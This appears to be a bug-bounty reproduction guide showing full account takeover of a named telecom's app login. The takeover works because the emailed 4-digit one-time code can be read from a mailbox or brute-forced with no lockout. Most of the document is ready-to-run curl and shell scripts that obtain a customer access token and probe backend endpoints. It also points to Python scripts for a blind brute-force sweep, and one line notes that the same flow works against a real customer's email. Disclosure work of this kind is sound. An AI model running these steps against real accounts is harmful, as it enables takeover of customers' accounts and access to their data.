# How to Reproduce — Full Account Takeover via 4-Digit Email OTP

**Target:** `https://vfo01.vodafone.om` (in scope) — My Vodafone app (MVA) email-OTP login.
**Two variants:**

- **A — Proven ATO in ~40 s** (attacker can read the OTP email: shared/forwarded mailbox, help desk, or a disposable mailbox for the demo). Completed end-to-end on 2026-10-14 12:33Z — see `evidence/ato_evidence_summary.txt`.
- **B — Blind brute force** (attacker never sees the email). 1,113 consecutive wrong guesses accepted with no lockout (`evidence/bf_run.log`); the full 10,000-code space is practical at ~0.5 guesses/s.

All requests below are the stock MVA Android app login traffic (UA suffixed `h1.recon`).

## 0. Setup (paste once)

```bash
UA="Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0 Mobile Safari/537.36 h1.recon"
V1="https://vfo01.vodafone.om"

post() {  # post <path> <json-body>
  curl -s -X POST "$V1$1" \
    -H "Content-Type: application/json" \
    -H "User-Agent: $UA" \
    -H "X-Application-ID: MVA_ANDROID" \
    -H "X-Request-ID: $(uuidgen)" \
    -H "X-Correlation-ID: $(uuidgen)" \
    -H "Zen-Application: MVA" \
    -H "Zen-OS: android" \
    -H "Zen-AppVersion: 5.2.2" \
    -d "$2"
}
```

## 0a. (Optional) Throwaway mailbox on api.mail.tm — so you can read the OTP email

```bash
DOMAIN=$(curl -s https://api.mail.tm/domains | jq -r '.hydra:member[] | select(.isActive==true) | .domain' | head -1)
ADDR="h1repro$(head -c 3 /dev/urandom | od -An -tx1 | tr -d ' \n')@$DOMAIN"
PW="Poc!$(head -c 6 /dev/urandom | od -An -tx1 | tr -d ' \n')"
curl -s -o /dev/null -w "mailbox created: %{http_code}\n" -X POST https://api.mail.tm/accounts \
  -H "Content-Type: application/json" -d "{\"address\":\"$ADDR\",\"password\":\"$PW\"}"
MTOK=$(curl -s -X POST https://api.mail.tm/token -H "Content-Type: application/json" \
  -d "{\"address\":\"$ADDR\",\"password\":\"$PW\"}" | jq -r .token)
echo "mailbox: $ADDR"
```

(For a demo against a *real* customer, skip this — use the customer's email and read the OTP however the attacker would in their variant; the flow below is identical.)

## Step 1 — Start the login session (PKCE)

```bash
VERIFIER=$(head -c 96 /dev/urandom | base64 | tr '+/' '-_' | tr -d '=\n' | head -c 64)
CHALLENGE=$(printf '%s' "$VERIFIER" | openssl dgst -sha256 -binary | base64 | tr '+/' '-_' | tr -d '=')

R1=$(post "/auth/api/public/login/v1/start" "{
  \"clientId\": \"MVA\",
  \"responseType\": \"code\",
  \"scope\": \"openid\",
  \"codeChallengeMethod\": \"S256\",
  \"codeChallenge\": \"$CHALLENGE\",
  \"state\": \"$(uuidgen)\"
}")
echo "$R1" | jq
TMP=$(echo "$R1" | jq -r .temporaryAccessToken)
SP=$(echo "$R1" | jq -r .nextStep.emailOtpMethod.secretPayload)
```

**Expected:** 200 JSON with `temporaryAccessToken` and `nextStep.emailOtpMethod.secretPayload`.
Note: any syntactically valid email is accepted later in the flow — even one that does not exist (the related High finding).

## Step 2 — Trigger the OTP email (`resend: true`)

```bash
R2=$(post "/auth/api/public/login/v1/authenticate" "{
  \"authToken\": {\"emailOtpToken\": {
    \"secretPayload\": \"$SP\",
    \"email\": \"$ADDR\",
    \"otp\": null,
    \"resend\": true
  }},
  \"temporaryAccessToken\": \"$TMP\"
}")
echo "$R2" | jq
NT=$(echo "$R2" | jq -r '.temporaryAccessToken // empty');   [ -n "$NT" ] && TMP="$NT"
NS=$(echo "$R2" | jq -r '.nextStep.emailOtpMethod.secretPayload // empty'); [ -n "$NS" ] && SP="$NS"
```

**Expected:** 200, `nextStep.emailOtpMethod.otpExpiresIn` ≈ 300–900 (code valid 5–15 min). A mail titled **"Log in to my Vodafone"** arrives containing the link `https://www.vodafone.om/confirmActivationEmail?otpCode=XXXX` — the 4-digit code is inside the link (`evidence/otp_email.html`).

> **Important:** `temporaryAccessToken` and `secretPayload` rotate in *every* response. Always re-read the freshest values from the last response before the next call (shown above).

## Step 3 — Read the 4-digit code (Variant A only)

```bash
OTP=""
for i in $(seq 1 40); do                                   # poll up to ~5 min (max observed delivery lag)
  MID=$(curl -s -H "Authorization: Bearer $MTOK" https://api.mail.tm/messages | jq -r '.hydra:member[0].id // empty')
  [ -z "$MID" ] && { sleep 8; continue; }
  MSG=$(curl -s -H "Authorization: Bearer $MTOK" "https://api.mail.tm/messages/$MID")
  OTP=$(echo "$MSG" | jq -r 'if (.html|type)=="array" then (.html|map(.content//"")|join(" ")) else (.html//"") end' \
        | grep -oE 'otpCode=[0-9]{4}' | head -1 | cut -d= -f2)
  [ -n "$OTP" ] && break
  sleep 8
done
echo "OTP code: $OTP"
```

## Step 4 — Submit the OTP → **accepted → authorization code**

```bash
R4=$(post "/auth/api/public/login/v1/authenticate" "{
  \"authToken\": {\"emailOtpToken\": {
    \"secretPayload\": \"$SP\",
    \"email\": \"$ADDR\",
    \"otp\": \"$OTP\",
    \"resend\": false
  }},
  \"temporaryAccessToken\": \"$TMP\"
}")
echo "$R4" | jq
AC=$(echo "$R4" | grep -oE 'code=[A-Za-z0-9_-]+' | head -1 | cut -d= -f2)
echo "auth code: $AC"
```

**Expected (success):** body contains `redirectUri: "https://esgw.pr.itcloud.vodafone.om/authorized?code=ac_..."` — no `nextStep`, no error (observed: `ac_gHE5SKDo6d45ujZkULDr2h5VN3OX6H0UsVQIGWhx`).
**Wrong OTP:** HTTP 200 with `nextStep.emailOtpMethod.otpStatus: "OTP_MISMATCH"` and a *decrementing* `otpAttemptsLeft` — the counter is cosmetic; guessing continues after it reaches 0.

## Step 5 — Exchange the code → **full customer JWT (ATO complete)**

```bash
R5=$(curl -s -X POST "$V1/auth/api/public/access-token/v1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: $UA" -H "X-Application-ID: MVA_ANDROID" \
  -H "X-Request-ID: $(uuidgen)" -H "X-Correlation-ID: $(uuidgen)" \
  -H "Zen-Application: MVA" -H "Zen-OS: android" -H "Zen-AppVersion: 5.2.2" \
  --data-urlencode "client_id=MVA" \
  --data-urlencode "scope=openid" \
  --data-urlencode "code_verifier=$VERIFIER" \
  --data-urlencode "code=$AC" \
  --data-urlencode "grant_type=authorization_code")
JWT=$(echo "$R5" | jq -r .access_token)
echo "CUSTOMER JWT: $JWT"
echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();print(json.dumps(json.loads(base64.urlsafe_b64decode(s+"="*(-len(s)%4))),indent=2))'
```

**Expected:** JWT with `scope: ["customers"]`, a `customer_id`, and 9 audiences (`MVA_ZDS`, `DXL_SPM`, `DXL_ZMS`, `DXL_CXC`, `DXL_SCM`, `DXL_OTP`, `CHAT`, `MVA`, `<VFO>`), 30-minute expiry.

## Step 6 — Prove the token is a real customer session (401 → 200 contrast)

```bash
curl -s -o /dev/null -w "no   Bearer -> %{http_code}\n" "https://vfo03.vodafone.om/chat/customer/v1/agents/availability"
curl -s -w "\nwith Bearer -> %{http_code}\n" -H "Authorization: Bearer $JWT" "https://vfo03.vodafone.om/chat/customer/v1/agents/availability"
```

**Expected:** 401 → **200** `{"anyAgentAvailable":false}` (observed with the ATO JWT, `evidence/jwt_probe2.json`).
Also: `https://vfo02.vodafone.om/api/public/profile/v1` and `/paymentMethods` — 401 without Bearer, business response with Bearer (500 "Exception in exception handler…" only because the demo account is unenrolled — separate secondary finding, see the report).

## Variant B — Blind brute force (no mailbox access needed)

Manual mini-demo — run **within the live window** of a code you just issued in Step 2; try 3 wrong codes and watch the server keep answering:

```bash
for C in 0000 1234 9999; do
  R=$(post "/auth/api/public/login/v1/authenticate" "{
    \"authToken\": {\"emailOtpToken\": {
      \"secretPayload\": \"$SP\",\"email\": \"$ADDR\",\"otp\": \"$C\",\"resend\": false}},
    \"temporaryAccessToken\": \"$TMP\"}")
  echo "$R" | jq '{otpStatus: .nextStep.emailOtpMethod.otpStatus, attemptsLeft: .nextStep.emailOtpMethod.otpAttemptsLeft}'
  NT=$(echo "$R" | jq -r '.temporaryAccessToken // empty');      [ -n "$NT" ] && TMP="$NT"
  NS=$(echo "$R" | jq -r '.nextStep.emailOtpMethod.secretPayload // empty'); [ -n "$NS" ] && SP="$NS"
  sleep 2
done
```

**Expected:** three HTTP 200s, each `otpStatus: "OTP_MISMATCH"` — no lockout, no captcha, no session invalidation.

Full sweep — use the PoC (static partition of 0000–9999, persistent position so no value is ever re-guessed, automatic WAF backoff; on hit → `bf_SUCCESS.json` with the JWT + claims):

```bash
python3 poc/poc_blind_bruteforce.py <target-email> 1    # cautious single session, ~0.5 guesses/s
```

Measured in the evidence run (`evidence/bf_run.log`, final line `+63m00s guesses=1113 resends=13 errors=57 found=False`): **1,113 guesses, 13 resends, 63 min — no lockout, no captcha, no account freeze**. The server additionally:

- keeps evaluating guesses after `otpAttemptsLeft` hits 0 (120+ consecutive wrong guesses against one code),
- keeps **multiple codes valid simultaneously** (3 live codes observed at once),
- accepts resends ~60 s apart, and sometimes delivers **two different codes in one resend**.

## Python PoC index (all stdlib, UA suffixed `h1.recon`)

| Script | What it does |
|---|---|
| `poc/poc_oto_selfissued.py <email> [codes...]` | Variant A — the proven ATO: self-issued code, reads a mail.tm mailbox, prints JWT + claims (writes `oto4_result.json`) |
| `poc/poc_blind_bruteforce.py <email> [workers]` | Variant B — blind sweep; on hit → `bf_SUCCESS.json` (JWT + claims) |
| `poc/poc.py` | Creates a disposable mailbox, completes the whole flow, prints JWT + claims; re-running shows the same `customer_id` (the related High: anonymous account creation) |

## Raw evidence index

| File | What it proves |
|---|---|
| `evidence/ato_evidence_summary.txt` | Timestamped ATO timeline + full JWT + decoded claims |
| `evidence/oto4_result.json` | Raw requests/responses of every ATO step |
| `evidence/otp_email.html` | The "Log in to my Vodafone" email containing `?otpCode=` |
| `evidence/bf_run.log`, `evidence/bf_log.jsonl` | Full blind run: 1,113 guesses, no lockout, issuance races |
| `evidence/blind_run_stats.json` | Blind-run statistics |
| `evidence/jwt_probe2.json` | 401-vs-200/500 backend contrast with the ATO JWT |
| `evidence/access_token_response.json`, `evidence/auth_code_response.txt`, `evidence/jwt_claims_and_live_verification.txt` | Original High-report token chain (related report) |
